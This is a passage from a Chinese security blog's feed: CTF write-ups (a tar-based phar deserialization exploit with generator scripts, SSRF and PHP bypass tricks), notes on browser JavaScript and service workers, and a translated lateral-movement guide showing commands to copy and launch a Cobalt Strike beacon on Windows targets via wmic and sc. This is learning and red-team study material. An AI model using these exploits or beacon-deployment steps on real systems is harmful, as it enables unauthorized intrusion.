    <span class="token keyword">private</span> <span class="token variable">$_flag</span> <span class="token operator">=</span> <span class="token string">'n1ctf{************************}'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"FLAG: "</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> 
<span class="token punctuation">}</span>

<span class="token keyword">include_once</span> <span class="token string">"log.php"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"file exist!"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"file not exist!"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token delimiter">?></span>
</code></pre>
<p>另一个log.php可以写文件，但是写入的内容有一些不可控数据，也不可控后缀</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'ROOT_PATH'</span><span class="token punctuation">,</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$log_type</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'log_type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$log_type</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$log_type</span> <span class="token operator">=</span> <span class="token string">"look"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$gets</span> <span class="token operator">=</span> <span class="token function">http_build_query</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$real_ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$log_ip_dir</span> <span class="token operator">=</span> <span class="token constant">ROOT_PATH</span> <span class="token punctuation">.</span> <span class="token string">'/log/'</span> <span class="token punctuation">.</span> <span class="token variable">$real_ip</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$log_ip_dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$log_ip_dir</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$log</span> <span class="token operator">=</span> <span class="token string">'Time: '</span> <span class="token punctuation">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">'Y-m-d H:i:s'</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">' IP: ['</span> <span class="token punctuation">.</span> @<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">'], REQUEST: ['</span> <span class="token punctuation">.</span> <span class="token variable">$gets</span> <span class="token punctuation">.</span> <span class="token string">'], CONTENT: ['</span> <span class="token punctuation">.</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input') . "]\n";</span>
<span class="token variable">$log_file</span> <span class="token operator">=</span> <span class="token variable">$log_ip_dir</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$log_type</span> <span class="token punctuation">.</span> <span class="token string">'_www.log'</span><span class="token punctuation">;</span>

<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$log_file</span><span class="token punctuation">,</span> <span class="token variable">$log</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter">?></span>
</code></pre>
<p>我一开始是完全没有理解这种东西能怎么打，直接看都没看懂该怎么去触发，（完全忘了phar这一回事）确实，file_exist也是能触发phar的函数之一，不过这里写入常规的phar文件似乎是不能正常解析的，phar文件无论是前面还是后面被添加了额外的数据，似乎都会导致checksum检验不过（主要是我也不是很懂phar文件的文件格式。。。）</p>
<p>wp中使用tar文件也能触发metadata的反序列化，而tar文件的格式比较简单且容易理解<br>tar文件在简单的打包情况下，就是以header1+content1+header2+content2+…+tar_end来构造的，并不具备压缩功能（甚至会占用更多的磁盘空间）<br>每一个块都是512字节的整数被，不足用\00补齐，最后用1024个\00表示tar结束<br>而tar的header由固定的数据结构组成</p>
<pre class=" language-C"><code class="language-C">type Header struct {
    name     [100]byte
    mode     [8]byte
    owner    [8]byte
    group    [8]byte
    size     [12]byte
    mtime    [12]byte
    checkSum [8]byte
    fileType byte
    linkName [100]byte
    magic     [6]byte
　　version     [2]byte
　　uname     [32]byte
　　gname     [32]byte
　　devmajor [8]byte
　　devminor [8]byte
　　prefix   [155]byte
　　padding  [12]byte
}
</code></pre>
<p>其中name变量的长度有100个字节，也就意味着，如果我们的输入前的不可控字符串在100个以内，我们就能把前面的无效数据作为文件名。而因为tar遇到连续的1024个\00后就认为tar结束了，因此可控输入后的无效数据也不影响tar包的解析（如果超过100个字节但是还没影响到checksum的话不知道前面的数据奇怪一点会不会影响解析，感觉可能就size比较关键？），也许在更复杂的情况下可以更加精心的构造出符合tar的数据</p>
<p>使用如下代码生成一个带metadata的tar包</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">CLASS</span> <span class="token class-name">FLAG</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"FLAG: "</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"get_flag.tar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PharData</span><span class="token punctuation">(</span><span class="token string">"get_flag.tar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token punctuation">[</span><span class="token string">"filename"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"filecontent"</span><span class="token punctuation">;</span>
<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>这个tar包实际上打包了两个文件，一个是我们的filename，另一个则是metadata，而这个metadata和phar中的metadata一样，再被phar协议处理时会触发反序列化</p>
<p>再使用类似这样子的脚本去重新计算checksum</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> struct
<span class="token comment" spellcheck="true"># use python2</span>

<span class="token comment" spellcheck="true"># checksum的计算方法为除去checksum字段其他所有的512-8共504个字节的Ascii码相加的值再加上256</span>
<span class="token keyword">def</span> <span class="token function">calc_checksum</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> sum<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>unpack_from<span class="token punctuation">(</span><span class="token string">"148B8x356B"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">256</span>


prefix <span class="token operator">=</span> <span class="token string">""</span>
<span class="token comment" spellcheck="true"># make it into phar format</span>
<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"payload.tar"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
new_name <span class="token operator">=</span> prefix<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
new_data <span class="token operator">=</span> new_name <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
checksum <span class="token operator">=</span> calc_checksum<span class="token punctuation">(</span>new_data<span class="token punctuation">)</span>
new_checksum <span class="token operator">=</span> oct<span class="token punctuation">(</span>checksum<span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">'\x00'</span>
new_data <span class="token operator">=</span> new_name <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">:</span><span class="token number">148</span><span class="token punctuation">]</span> <span class="token operator">+</span> new_checksum <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token number">156</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>new_data<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>prefix<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> b<span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>既然tar的适应性这么强，考虑一下能不能在无法写文件的时候究极upload progress完成利用？<br>然后发现PHP要求phar协议解析的文件一定要有一个后缀名（是啥都行），不然就会把那个文件当做目录来看待而报错。。。</p>
<p>还有一件事，PHP（在某一个版本或者是从PHP8开始）已经停止了在文件流操作时自动反序列化metadata数据，也就是说经典反序列化在最新版本下已经没有用了，PHP真是越来越安全了</p>
<h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><p>等wping，还有好多东西没写，搞不动了<br>躺会</p>
<p>今天更新的时候发现typora怎么突然收费了呢？不更新&#x3D;&#x3D;&#x3D;永久免费</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/259487">0RAYS-L3HCTF2021 writeup-web</a><br><a href="https://xz.aliyun.com/t/10533">2021深育杯线上初赛官方WriteUp</a><br><a href="https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html">MySQL写shell</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzU1MTkwMTY1NQ==&mid=2247490421&idx=1&sn=1200e843e091a2b0f33d03a6a4f676e8&chksm=fb8b1bcdccfc92db6bceb0cde8b19be541fcfda33fd35bb92c4c048ae088f3f520f7a8046651&mpshare=1&scene=23&srcid=1121Bm0ZUeVoyDhZUGicjEdo&sharer_sharetime=1637468576274&sharer_shareid=4fbfc4ca172e056279ec9e2be19cf8fb#rd">西湖论剑2021中国杭州网络安全技能大赛writeup</a><br><a href="https://blog.csdn.net/DisMisPres/article/details/94733424">tar文件结构</a><br><a href="https://harold.kim/blog/2021/11/n1ctf-writeup/">n1ctf-writeup</a><br><a href="https://r3kapig.com/writeup/20211122-n1ctf">N1CTF 2021 Writeup</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>gopher</tag>
      </tags>
  </entry>
  <entry>
    <title>最近做的奇怪题目</title>
    <url>/%E6%9C%80%E8%BF%91%E5%81%9A%E7%9A%84%E5%A5%87%E6%80%AA%E9%A2%98%E7%9B%AE.html</url>
    <content><![CDATA[<h1 id="最近做的奇怪题目"><a href="#最近做的奇怪题目" class="headerlink" title="最近做的奇怪题目"></a>最近做的奇怪题目</h1><p>DASbaby中北啥的吧，都记不清了（能做出来的题目质量都不怎么高，做不出来的题目又都不会呜呜）</p>
<h2 id="rust题"><a href="#rust题" class="headerlink" title="rust题"></a>rust题</h2><p>题名都忘了，就记得是rust写的，硬着头皮看了一会<br>打怪，玩家基数0，怪基数从1-1w?<br>然后有一个硬币，可以花硬币增加属性。属性是基数*random(0,1)生成的<br>花硬币可以从负数花起，然后自己就能拥有一堆的币，然后属性负一堆<br>一种做法就是先亏他1e10个币再花他1e10个币，只要之后的随机数比之前的大就无敌了，看着自己的属性是不知道多少位数打最高才四五位数的boss，我大概理解了什么叫一拳超人</p>
<p>还有一种做法是输入科学计数法，硬币做消耗减法的时候不会正确解析，然后给属性做加法的时候会正确解析，打通</p>
<h2 id="baby验证码"><a href="#baby验证码" class="headerlink" title="baby验证码"></a>baby验证码</h2><p>阴间验证码功能，wp还没放出正解，验证码是放在session中记录的，并且还不会过期，保存session然后硬听一个验证码就能爆破了<br>我猜正解可能是分析那个音频？不知道是不是简单的拼起来的，如果能把他分隔开来然后每次一段段的分析也许还行，不会misc拉倒ing</p>
<h2 id="baby剩下几个"><a href="#baby剩下几个" class="headerlink" title="baby剩下几个"></a>baby剩下几个</h2><p>有点脑溢血。。。一个是discuz安装的时候直接往数据库文件写shell，一个是rouge MySQL任意文件读，还有一个是写了垃圾代码过upload&#x3D;&#x3D;upload又upload!&#x3D;&#x3D;upload，还有啥忘了</p>
<h2 id="中北"><a href="#中北" class="headerlink" title="中北"></a>中北</h2><h3 id="web"><a href="#web" class="headerlink" title="web?"></a>web?</h3><p>一个gopher打post的简单ssrf，在eval后面调用了ob_get_contents和ob_end_clean，简单的导致无回显，然后限制eval的长度在30以内<br>直接令eval再eval一个$_GET[a]就能跳过字符长度限制了，先执行命令在整个ob_start就能解决后面的垃圾代码了<br>（这个题真不难，但是我content-length那里忘了记code&#x3D;的长度半天没打通。。。。然后一开始还忘记二次编码了）还有一点，ssrf打的shell.php也真有你的，一开始内网探测无果，幸好dirsearch足够牛逼</p>
<h3 id="web-1"><a href="#web-1" class="headerlink" title="web??"></a>web??</h3><p>一个超级套娃题，唯一的难点是那个<code>$_POST[&#39;crack_me.com&#39;]</code>，这我真没见过，PHP在接收参数的时候会把空格方括号点号什么的都变成下划线，所以没法post一个变量名带点的变量上去。<br>然后超级神仙瞬间秒杀这个垃圾题，post一个<code>crack[me.com</code>就能使得方括号变成下划线但是后面的点不变成下划线，什么奇妙的原理。。。神仙指出这是一个原题<br>之后是php filter里面可以塞垃圾协议正常用，PHP伪随机数爆破，ssrf，无字母数字命令执行。。。超级套娃题，建议出题人还是不要太混的好<br>又：ssrf的时候又忘记二次编码了导致一开始没打通</p>
<h3 id="web-2"><a href="#web-2" class="headerlink" title="web???"></a>web???</h3><p>反序列化，大概意思是要让obj-&gt;flag&#x3D;&#x3D;&#x3D;’flag’又不全等与’flag’，有点经典<br>用stdClass类来实现创建一个有flag属性的对象<br>反序列化的flag正则用S的编码字符串绕过，令flag&#x3D;&#x3D;&#x3D;’flag’之后，再整一个成员属性是flag的引用，就能在赋值之后后面这个属性名不等于flag把flag输出出来</p>
<p>剩下的记不清了，有个点开一看就是thinkphp的，光速拉倒，一个js的文件上传，上传文件名不可控，不知道怎么打，一个js的计算器，就一个调库，搜得到的洞是一个原型链污染，但是污染了打哪没想出来，然后摸摸鱼就结束了</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器JS运行相关</title>
    <url>/%E6%B5%8F%E8%A7%88%E5%99%A8js%E8%BF%90%E8%A1%8C%E7%9B%B8%E5%85%B3.html</url>
    <content><![CDATA[<h1 id="浏览器JS运行相关"><a href="#浏览器JS运行相关" class="headerlink" title="浏览器JS运行相关"></a>浏览器JS运行相关</h1><p>前端学习系列，总觉得学着学着就像自己转前端了一样，起因是今天西湖论剑出了一个XSS的难度正无穷的题，后来放了个hint提到了service worker线程，就提到了JavaScript主进程是单线程的，如此这般如此这般。<br>最后结束了题做不出来前端知识又学了一点点</p>
<h2 id="浏览器基本模型"><a href="#浏览器基本模型" class="headerlink" title="浏览器基本模型"></a>浏览器基本模型</h2><p>当前的浏览器多采用多进程模型，开那么四五六七个进程来执行任务，他们分别有Browser Process，Network Process，GPU Process，Render Process等等等等一大堆进程，各司其职完成工作。<br>Browser Process是主进程，就是控制诸多进程的控制进程，Network Process必然就是网络请求管理进程了，不多说，今天主要分析的就是这个Render Process，它主要进行页面渲染（加特效什么的），脚本执行，事件处理等等</p>
<h2 id="渲染进程"><a href="#渲染进程" class="headerlink" title="渲染进程"></a>渲染进程</h2><p>首先明确一点，一般来说一个tab（就是一个标签页），会对应一个渲染进程（如果资源不足可能会导致多个标签页的渲染进程被合并到一个进程里），然后渲染进程里面有各种各样的线程来完成对这一个标签页的渲染，有</p>
<blockquote>
<p>GUI渲染进程 主要负责渲染界面，就是HTML CSS之类的<br>事件触发线程    控制任务队列，管理异步的触发事件<br>定时触发线程 setTimeout之类的函数的计时器<br>异步请求线程 就发Ajax请求之类的线程<br>JavaScript引擎线程，比如Chrome用的v8引擎</p>
</blockquote>
<p>总所周知，在构建DOM树的时候，不能js和HTML独立解析，必须是遇到js就去找js引擎解析，因为js可以操作DOM树，所以GUI引擎和JS引擎互斥。<br>那么问题就来了，如果我这个js脚本超级计算，一直阻塞DOM树解析咋办，用户表示为什么这么卡？</p>
<h3 id="service-worker"><a href="#service-worker" class="headerlink" title="service worker"></a>service worker</h3><p>终于回到我们初始的话题，所谓的service worker就是来解决这个问题的<br>service worker是一份放在服务器上的js代码，浏览器访问服务器后就会在本地注册（如果浏览器支持这个功能的话）service worker独立工作在worker上下文，因此无权限操作DOM树，但能辅助完成，加速js代码计算，超级计算全都给新开的线程去做，做好了再返回给js主进程即可，并且他和js主进程独立，所以不阻塞，可以减缓js引擎单线程运作导致的页面渲染缓慢<br>不仅仅是加速js解析，它还能充当一个浏览器与服务器之间的中间件，或者说代理，能够修改用户获取的资源，甚至在离线情况下可以通过缓存来定义页面行为，提升用户的体验（逐渐跑题）</p>
<p>然后这次西湖论剑的题目似乎就是控制了service worker，使用它能控制用户请求资源的能力完成XSS（但是我还完全没懂我怎么控制service worker，打到服务器上去修改注册代码吗？）</p>
<p>service worker也不同于比较古老的Web Worker，web worker只能加速一个tab的内容，而service work可以控制其注册的路径下所有文件的内容，如果service worker的作用域是网站的根目录，那么你浏览这个网站的所有访问都可以受到service work的帮助（如果service worker被日了也同理能控制所有你请求的资源）但是我还是没懂那个题怎么整，有可能这里有说错的，等wp出了再补</p>
<h3 id="JS-EventLoop"><a href="#JS-EventLoop" class="headerlink" title="JS EventLoop"></a>JS EventLoop</h3><p>都学到这了，就顺便看了一下JS的执行过程，单线程执行的JS使用EventLoop的形式来执行命令，分为同步任务和异步任务，同步任务就按顺序堆等着主进程一个个来做，形成一个<strong>执行栈</strong>。</p>
<p>而JS还有setTimeout之类的函数，在时间到了之后执行回调函数，就是异步任务。因为JS主进程已经忙的自顾不暇了，加上自身是阻塞的单线程，完全没时间管这些，所以这些异步事件还需要一个事件触发线程来管理，事件触发线程管理一个任务队列，当符合条件的事情触发的时候就把对应处理事件推进队尾，等待触发<br>而JS单线程慢慢跑，所以执行栈上的东西没有被执行完的话，任务队列里的任务是不会被处理的，所以我们看看这个代码</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'hello!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'begin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>setTimeout填了个0，意思是马上执行console.log(‘hello!’)，感觉应该是显示出hello再输出begin，然而事实并非如此，因为这就是触发了一个异步事件，丢给定时触发线程和时间触发线程去做了，就算是立即执行，也是立即给你推进任务队列，而执行栈上顺序执行的事情还没做完，我begin还没输出，轮不到你任务队列，所以就算timeout是0，你也没办法立即执行<br><del>当然其实还有一个小小的点，W3C的规定中小于4ms的间隔被认为是4ms，但是就算间隔真的是0ms，也是会遵循这个执行规则来的</del><br>EventLoop就算反复在执行栈和任务队列里面循环，把任务一个个的放进任务池里一个个顺序执行，单线程啊单线程</p>
<h2 id="挖的坑"><a href="#挖的坑" class="headerlink" title="挖的坑"></a>挖的坑</h2><p>异步执行的相关内容还有Promise，没学，开始挖坑待填<br>还突然看到人提到了service work能不能辅助当前窗口下非同源的iframe（我听不懂），前两天AA也和我说过iframe同源策略什么的问题，太复杂了我不会</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://zhuanlan.zhihu.com/p/47407398">图蛮多的挺可爱的浏览器工作原理讲解</a><br><a href="https://www.cnblogs.com/cangqinglang/p/8963557.html">讲的超级清楚的好文章</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API">service worker的MDN文档</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>横向移动</title>
    <url>/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.html</url>
    <content><![CDATA[<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><p>本文基本上译自参考链接Lateral Movement</p>
<h2 id="寻找拥有访问权限的地方"><a href="#寻找拥有访问权限的地方" class="headerlink" title="寻找拥有访问权限的地方"></a>寻找拥有访问权限的地方</h2><p>使用以下一种或多种方法，将向Active Directory用户授予对通用资源的访问权限:</p>
<ul>
<li>使用组策略对象（GPO）将用户添加到本地组</li>
<li>本地添加用户到本地组，可以通过net.exe完成所述功能</li>
<li>模拟一个在多个系统中使用相同密码的本地用户</li>
<li>对共享文件提供读权限</li>
<li>在AD中配置访问控制列表（ACL）</li>
<li>使用AD用户&#x2F;组配置对MSSQL实例的访问</li>
</ul>
<p>关于本地组关系，我们应该对如下几个组最感兴趣</p>
<ul>
<li>Administrators</li>
<li>Remote Desktop Users</li>
<li>Remote Management Users</li>
<li>Distributed COM Users</li>
</ul>
<h3 id="本地组成员-盲接触"><a href="#本地组成员-盲接触" class="headerlink" title="本地组成员-盲接触"></a>本地组成员-盲接触</h3><p>测试我们是否拥有远程机器的本地管理员权限（位于Administrator组）的最简单方法就是dir一下远程目录<br><code>dir \\&lt;TARGET&gt;\C$</code><br>文件资源管理器直接访问也行<br>或者这个命令<br><code>powershell.exe Get-WMIObject -Class win32_operatingsystem -Computername TARGET</code><br>不过一个个试未免显得有些愚蠢，所以可以使用PowerView(现在已经整合到PowerSploit里面去了)的命令行工具<code>Find-LocalAdminAccess</code>自动化找到当前用户在该域下拥有管理员权限的机器（虽然我已经找不到整合进PowerSploit的哪里面了）</p>
<p>对于Remote Management Users，可以使用·Invoke-Command·这个工具检查能否在远程机器上执行命令<br><code>Invoke-Command -Computername TARGET -ScriptBlock &#123;whoami&#125;</code><br>Administrator组的用户也可成功执行上述命令<br>对于Remote Desktop Users可以尝试进行一个RDP连接进行尝试<br>对于Remote COM Users可以使用接下来将要讲述的DCOM技术进行验证</p>
<h3 id="本地组成员-组策略对象"><a href="#本地组成员-组策略对象" class="headerlink" title="本地组成员-组策略对象"></a>本地组成员-组策略对象</h3><p>在默认情况下，任何一个域内用户都可以读取所有的GPO内容，可以通过查看GPO来收集一些信息，且这个操作相较于之前会触发更少的报警和日志<br>可以使用很多工具进行GPO的分析</p>
<ul>
<li>PowerView</li>
<li>BloodHound<br>使用Get-NetGPOGroup工具获得所有配置在本地的GPO<br>使用<code>whoami /groups</code>查看自身所在的组<br>需要注意的是想要枚举远程的本地组需要拥有本地管理员权限<br>使用BloodHound时会将如下节点的关系对应到本地组成员中</li>
</ul>
<table>
<thead>
<tr>
<th align="left">BloodHound Relationship</th>
<th align="left">Local Group Membership</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>CanRDP</code></td>
<td align="left"><code>Remote Desktop Users</code></td>
</tr>
<tr>
<td align="left"><code>AdminTo</code></td>
<td align="left"><code>Administrators</code></td>
</tr>
<tr>
<td align="left"><code>ExecuteDCOM</code></td>
<td align="left"><code>Remote COM Users</code></td>
</tr>
<tr>
<td align="left"><code>CanPSRemote</code></td>
<td align="left"><code>Remote Management Users</code></td>
</tr>
</tbody></table>
<h3 id="访问共享文件"><a href="#访问共享文件" class="headerlink" title="访问共享文件"></a>访问共享文件</h3><p>使用如下命令快速列出目标机器的共享文件（同样还是可以使用文件资源管理器）<br><code>net view TARGET</code><br>使用PowerView的<code>Invoke-ShareFinder</code>可以自动化的列出域内所有共享文件，<code>-CheckAccess</code>flag将会展示当前用户对该文件的读写权限</p>
<h3 id="访问控制列表-ACL"><a href="#访问控制列表-ACL" class="headerlink" title="访问控制列表(ACL)"></a>访问控制列表(ACL)</h3><p>AD很复杂，因此我们以最直接的方式来解释ACL的概念，AD是一系列对象的数据库，而对象则分为:</p>
<ul>
<li>用户</li>
<li>计算机</li>
<li>组</li>
<li>组织单元（OU）</li>
<li>组策略对象（GPO）<br>ACL则控制访问这些对象的权利，ACL由访问控制项组成（ACE），每一个AD object都有一个ACL确定可以在其上执行的操作</li>
</ul>
<p>如果我们可控的一个用户通过配错了的ACL控制某些AD管理员，就能完成横向移动的目的，比如某个管理员账户允许被其他账户改密码（这是有多蠢才能配成这样。。。）</p>
<h3 id="MSSQL访问"><a href="#MSSQL访问" class="headerlink" title="MSSQL访问"></a>MSSQL访问</h3><p>可以通过配置MSSQL服务使得其通过AD凭证进行用户认证，可以使用<code>PowerUpSQL</code>工具对域内的所有MSSQL服务器进行发现并尝试与其进行接触<br>使用如下命令发现域内所有SQL服务器<br><code>Get-SQLInstanceDomain -Verbose</code><br>或是将上一个命令管道到另一个工具中以测试我们能否访问该访问<br><code>Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose -Threads 15</code></p>
<h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><table>
<thead>
<tr>
<th align="left">Requires Admin</th>
<th align="left">Local Group Membership</th>
<th align="left">ATTACK ID</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Yes</td>
<td align="left"><code>Administrators</code></td>
<td align="left">N&#x2F;A</td>
</tr>
</tbody></table>
<p>WMI全称Windows Management Instrumentation，即windows管理规范（？乱翻译的），使用WMI在远程机器上创建进程是完全可行的，且其语法十分简单，如下<br><code>wmic /node:TARGET process call create &quot;notepad.exe&quot;</code><br>当然，只是启动一个进程完全能打穿机器，但是我们可以上传一些比如CobaltStrike生成的SMB信标，并使用WMI执行之</p>
<pre class=" language-powershell"><code class="language-powershell">shell <span class="token function">copy</span> smb<span class="token operator">-</span>beacon<span class="token punctuation">.</span>exe \\TARGET\C$\windows\temp
shell wmic <span class="token operator">/</span>node:TARGET <span class="token keyword">process</span> call create “c:\windows\temp\smb<span class="token operator">-</span>beacon<span class="token punctuation">.</span>exe”
link TARGET`
</code></pre>
<p>最后的<code>link TARGET</code>命令是CobaltStrike特有的需求，使用其连接SMB信标打开的命名管道<br>关于SMB信标详见文末参考文章，简要的就是SMB Beacon进行正向连接，目标机器必须开启445端口，使用命名管道执行命令<br>当然这不是让机器上线的唯一方法，你甚至能通过一句话命令不修改硬盘的使机器上线(大概是直接载入内存？但是怎么做呢)</p>
<h2 id="远程服务创建"><a href="#远程服务创建" class="headerlink" title="远程服务创建"></a>远程服务创建</h2><p>即Remote Service Creation</p>
<table>
<thead>
<tr>
<th align="left">Requires Admin</th>
<th align="left">Local Group Membership</th>
<th align="left">ATTACK ID</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Yes</td>
<td align="left"><code>Administrators</code></td>
<td align="left">N&#x2F;A</td>
</tr>
<tr>
<td align="left">使用<code>sc.exe</code>可以创建在远端机器上创建一个服务</td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<pre class=" language-powershell"><code class="language-powershell"><span class="token function">copy</span> smb<span class="token operator">-</span>beacon<span class="token punctuation">.</span>exe \\TARGET\C$\windows\temp
<span class="token function">sc</span> \\TARGET create TestService binpath= <span class="token string">"C:\windows\temp\smb-beacon.exe"</span>
